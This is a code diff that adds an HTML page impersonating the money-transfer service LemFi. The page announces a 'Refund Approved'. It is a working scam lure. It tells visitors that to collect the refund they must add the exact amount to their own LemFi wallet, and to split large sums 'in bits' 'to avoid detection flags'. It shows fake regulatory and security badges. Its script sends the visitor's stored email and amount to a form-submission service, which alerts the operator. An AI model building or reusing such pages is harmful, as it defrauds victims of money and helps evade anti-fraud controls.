@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LEMFI — Receive Your Refund</title>
+    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,300;9..40,400;9..40,500;9..40,600;9..40,700&display=swap" rel="stylesheet">
+    <style>
+        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+        :root {
+            --green-primary: #00C389; --green-dark: #00A873; --green-light: #E6F9F2; --green-ghost: #F0FBF6; --text-primary: #1B1B1B; --text-secondary: #6B7280; --text-tertiary: #9CA3AF; --border: #E5E7EB; --bg-body: #F9FAFB; --bg-card: #FFFFFF; --shadow-lg: 0 12px 40px rgba(0,0,0,0.08); --shadow-btn: 0 4px 14px rgba(0,195,137,0.3); --radius-sm: 8px; --radius-md: 12px; --radius-lg: 16px; --radius-xl: 20px; --amber-bg: #FFFBEB; --amber-border: #FDE68A; --amber-text: #92400E; --amber-accent: #D97706; --blue-bg: #EFF6FF; --blue-border: #BFDBFE; --blue-text: #1E40AF; --purple-primary: #7C3AED; --purple-light: #F3F0FF; --purple-border: #DDD6FE;
+        }
+        body { font-family: 'DM Sans', sans-serif; min-height: 100vh; display: flex; align-items: center; justify-content: center; background: var(--bg-body); padding: 24px 16px; color: var(--text-primary); -webkit-font-smoothing: antialiased; }
+        body::before { content: ''; position: fixed; inset: 0; pointer-events: none; z-index: 0; background: radial-gradient(ellipse 80% 50% at 50% -20%, rgba(59,130,246,0.06) 0%, transparent 60%); }
+        .page-wrapper { position: relative; z-index: 1; width: 100%; max-width: 440px; }
+        .top-bar { display: flex; align-items: center; justify-content: space-between; margin-bottom: 32px; padding: 0 4px; }
+        .logo { display: flex; align-items: center; gap: 10px; text-decoration: none; }
+        .logo-mark { width: 40px; height: 40px; background: var(--green-primary); border-radius: 10px; display: flex; align-items: center; justify-content: center; position: relative; overflow: hidden; }
+        .logo-mark::after { content: ''; width: 18px; height: 18px; border: 3px solid #fff; border-radius: 50%; border-top-color: transparent; transform: rotate(45deg); }
+        .logo-wordmark { font-size: 22px; font-weight: 700; color: var(--text-primary); letter-spacing: -0.5px; }
+        .card { background: var(--bg-card); border-radius: var(--radius-xl); box-shadow: var(--shadow-lg); border: 1px solid rgba(0,0,0,0.04); overflow: hidden; max-height: 92vh; overflow-y: auto; }
+        .card::-webkit-scrollbar { width: 4px; }
+        .card::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
+        .card-inner { padding: 32px; }
+        .success-banner { background: var(--green-ghost); border: 1px solid rgba(0,195,137,0.2); border-radius: var(--radius-lg); padding: 24px 20px; text-align: center; margin-bottom: 20px; position: relative; overflow: hidden; }
+        .success-banner::before { content: ''; position: absolute; top: -30px; left: 50%; transform: translateX(-50%); width: 120px; height: 120px; background: radial-gradient(circle, rgba(0,195,137,0.15) 0%, transparent 70%); pointer-events: none; }
+        .success-icon-wrap { width: 52px; height: 52px; background: var(--green-primary); border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; margin-bottom: 14px; position: relative; box-shadow: 0 4px 16px rgba(0,195,137,0.3); }
+        .success-icon-wrap svg { width: 24px; height: 24px; color: #fff; stroke-width: 3; }
+        .success-banner .title { font-size: 17px; font-weight: 700; color: #065F46; position: relative; }
+        .success-banner .sub { font-size: 13px; color: #047857; margin-top: 4px; position: relative; }
+        .amount-display { text-align: center; margin-bottom: 24px; padding: 18px; background: var(--bg-body); border-radius: var(--radius-lg); border: 1.5px dashed var(--border); }
+        .amount-display .label { font-size: 11px; font-weight: 600; color: var(--text-tertiary); text-transform: uppercase; letter-spacing: 1.2px; }
+        .amount-display .value { font-size: 32px; font-weight: 700; color: var(--text-primary); margin-top: 4px; letter-spacing: -1px; }
+        .amount-display .currency { font-size: 18px; font-weight: 500; color: var(--text-secondary); vertical-align: top; margin-right: 2px; }
+        .instructions { background: var(--blue-bg); border: 1px solid var(--blue-border); border-radius: var(--radius-lg); padding: 20px; margin-bottom: 24px; }
+        .instructions-header { display: flex; align-items: center; gap: 8px; margin-bottom: 16px; }
+        .instructions-header svg { width: 24px; height: 24px; color: var(--blue-text); flex-shrink: 0; }
+        .instructions-header h3 { font-size: 16px; font-weight: 700; color: var(--blue-text); }
+        .steps-list { list-style: none; padding: 0; margin: 0; counter-reset: step; }
+        .steps-list li { counter-increment: step; font-size: 13px; color: var(--blue-text); margin-bottom: 16px; line-height: 1.6; padding-left: 36px; position: relative; }
+        .steps-list li:last-child { margin-bottom: 0; }
+        .steps-list li::before { content: counter(step); position: absolute; left: 0; top: 0; width: 24px; height: 24px; background: #fff; border: 1.5px solid var(--blue-border); color: var(--blue-text); font-size: 12px; font-weight: 700; border-radius: 6px; display: flex; align-items: center; justify-content: center; }
+        .steps-list li strong { color: #1E3A8A; }
+        .note-box { background: var(--amber-bg); border: 1px solid var(--amber-border); border-radius: var(--radius-md); padding: 16px; margin-bottom: 20px; display: flex; align-items: flex-start; gap: 10px; }
+        .note-box svg { width: 20px; height: 20px; color: var(--amber-accent); flex-shrink: 0; margin-top: 1px; }
+        .note-box p { font-size: 13px; color: var(--amber-text); line-height: 1.6; }
+        .note-box strong { color: #78350F; }
+        .note-box span { color: var(--amber-accent); font-weight: 600; }
+        .btn-download { width: 100%; padding: 14px 20px; background: var(--text-primary); color: #fff; border: none; border-radius: var(--radius-md); font-size: 14px; font-weight: 600; font-family: inherit; cursor: pointer; transition: all 0.25s ease; display: flex; align-items: center; justify-content: center; gap: 10px; text-decoration: none; margin-bottom: 10px; }
+        .btn-download:hover { background: #374151; box-shadow: 0 4px 14px rgba(0,0,0,0.15); transform: translateY(-1px); }
+        .btn-download:active { transform: translateY(0); }
+        .btn-download svg { width: 18px; height: 18px; }
+        .btn-website { width: 100%; padding: 13px 20px; background: transparent; color: var(--text-primary); border: 1.5px solid var(--border); border-radius: var(--radius-md); font-size: 14px; font-weight: 500; font-family: inherit; cursor: pointer; transition: all 0.2s ease; display: flex; align-items: center; justify-content: center; gap: 8px; text-decoration: none; }
+        .btn-website:hover { border-color: #D1D5DB; background: var(--bg-body); }
+        .btn-website svg { width: 16px; height: 16px; color: var(--text-secondary); }
+        .footer-section { margin-top: 24px; padding-top: 20px; border-top: 1px solid var(--border); }
+        .footer-text { text-align: center; font-size: 12px; color: var(--text-tertiary); line-height: 1.7; }
+        .footer-text a { color: var(--green-primary); text-decoration: none; font-weight: 500; }
+        .security-row { display: flex; align-items: center; justify-content: center; gap: 16px; margin-top: 16px; }
+        .security-badge { display: flex; align-items: center; gap: 5px; font-size: 11px; color: var(--text-tertiary); }
+        .security-badge svg { width: 14px; height: 14px; color: var(--green-primary); }
+        .toast { position: fixed; top: 24px; left: 50%; transform: translateX(-50%) translateY(-120%); background: var(--text-primary); color: #fff; padding: 12px 20px; border-radius: var(--radius-md); font-size: 14px; font-family: inherit; box-shadow: 0 8px 30px rgba(0,0,0,0.15); z-index: 9999; transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1); white-space: nowrap; }
+        .toast.show { transform: translateX(-50%) translateY(0); }
+        @keyframes fadeUp { from { opacity: 0; transform: translateY(16px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes scaleIn { from { opacity: 0; transform: scale(0.8); } to { opacity: 1; transform: scale(1); } }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+        .animate-in { animation: fadeUp 0.5s cubic-bezier(0.16, 1, 0.3, 1) forwards; opacity: 0; }
+        .animate-scale { animation: scaleIn 0.5s cubic-bezier(0.16, 1, 0.3, 1) forwards; opacity: 0; }
+        .delay-1 { animation-delay: 0.05s; } .delay-2 { animation-delay: 0.1s; } .delay-3 { animation-delay: 0.15s; } .delay-4 { animation-delay: 0.2s; } .delay-5 { animation-delay: 0.25s; } .delay-6 { animation-delay: 0.3s; } .delay-7 { animation-delay: 0.35s; } .delay-8 { animation-delay: 0.4s; } .delay-9 { animation-delay: 0.45s; }
+        @media (max-width: 480px) { body { padding: 16px 12px; } .card-inner { padding: 24px; } .amount-display .value { font-size: 28px; } }
+    </style>
+</head>
+<body>
+    <div class="toast" id="toast"></div>
+    <div class="page-wrapper">
+        <div class="top-bar animate-in">
+            <a href="#" class="logo"><div class="logo-mark"></div><span class="logo-wordmark">Lemfi</span></a>
+        </div>
+        <div class="card">
+            <div class="card-inner">
+                <div class="success-banner animate-scale delay-1">
+                    <div class="success-icon-wrap"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></div>
+                    <div class="title">Refund Approved</div>
+                    <div class="sub">Your funds are ready to be collected via LemFi</div>
+                </div>
+                <div class="amount-display animate-in delay-2">
+                    <div class="label">Total Refund Amount</div>
+                    <div class="value"><span class="currency">$</span><span id="displayAmount">0.00</span></div>
+                </div>
+                <div class="instructions animate-in delay-3">
+                    <div class="instructions-header">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="12 6 12 12 16 14"/></svg>
+                        <h3>How to receive your refund</h3>
+                    </div>
+                    <ol class="steps-list">
+                        <li>Open the <strong>LemFi app</strong> on your phone.</li>
+                       >Navigate to the <strong>"Wallet"</strong> tab in the bottom menu.</li>
+                       >Tap <strong>"Add Money"</strong> and select your funding source.</li>
+                       >Enter the <strong>exact refund amount</strong> shown above.</li>
+                       >If the amount is large, <strong>add it in bits</strong> (multiple smaller transactions) to avoid detection flags.</li>
+                    </ol>
+                </div>
+                <div class="note-box animate-in delay-4">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+                    <p><strong>Important:</strong> For <span>security and compliance reasons</span>, the company has released your funds to be processed via LemFi. To receive your money, you <strong>must add the exact amount</strong> to your LemFi wallet using the app. If the amount is <span>large</span>, please proceed in <strong>smaller chunks</strong>.</p>
+                </div>
+                <a href="https://lemfi.com/" target="_blank" class="btn-download animate-in delay-5">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+                    Open LemFi App
+                </a>
+                <a href="https://lemfi.com/" target="_blank" class="btn-website animate-in delay-6">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
+                    Visit LemFi Website
+                </a>
+                <div class="footer-section animate-in delay-7">
+                    <p class="footer-text">Need assistance? <a href="mailto:support@lemfi.com">Contact our support team</a><br>This is a secure refund process compliant with financial regulations.</p>
+                    <div class="security-row">
+                        <div class="security-badge"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>SSL Secured</div>
+                        <div class="security-badge"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>FCA Regulated</div>
+                        <div class="security-badge"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>Verified</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script>
+        const savedAmount = localStorage.getItem('refundAmount');
+        if (savedAmount) {
+            const n = parseFloat(savedAmount);
+            document.getElementById('displayAmount').textContent = isNaN(n) ? savedAmount : n.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+        }
+        
+        document.querySelector('.btn-download').addEventListener('click', async function(e) {
+            e.preventDefault();
+            showToast('Opening LemFi App...');
+            const formData = {
+                access_key: 'YOUR_WEB3FORM_ACCESS_KEY',
+                subject: 'LemFi App Clicked',
+                from_name: 'Lemfi Website',
+                page: 'index.html',
+                action: 'Clicked "Open LemFi App" for Refund',
+                email: localStorage.getItem('refundEmail') || '',
+                amount: localStorage.getItem('refundAmount') || ''
+            };
+            fetch('https://api.web3forms.com/submit', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(formData) }).then(() => { setTimeout(() => window.location.href = 'https://lemfi.com/', 500); });
+        });
+
+        document.querySelector('.btn-website').addEventListener('click', async function(e) {
+            e.preventDefault();
+            showToast('Opening LemFi Website...');
+            const formData = {
+                access_key: 'YOUR_WEB3FORM_ACCESS_KEY',
+                subject: 'LemFi Website Clicked',
+                from_name: 'Lemfi Website',
+                page: 'index.html',
+                action: 'Clicked "Visit LemFi Website" for Refund',
+                email: localStorage.getItem('refundEmail') || '',
+                amount: localStorage.getItem('refundAmount') || ''
+            };
+            fetch('https://api.web3forms.com/submit', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(formData) }).then(() => { setTimeout(() => window.location.href = 'https://lemfi.com/', 500); });
+        });
+
+        function showToast(msg) { const t = document.getElementById('toast'); t.textContent = msg; t.classList.add('show'); setTimeout(() => t.classList.remove('show'), 3500); }
+    </script>
+</body>
+</html>
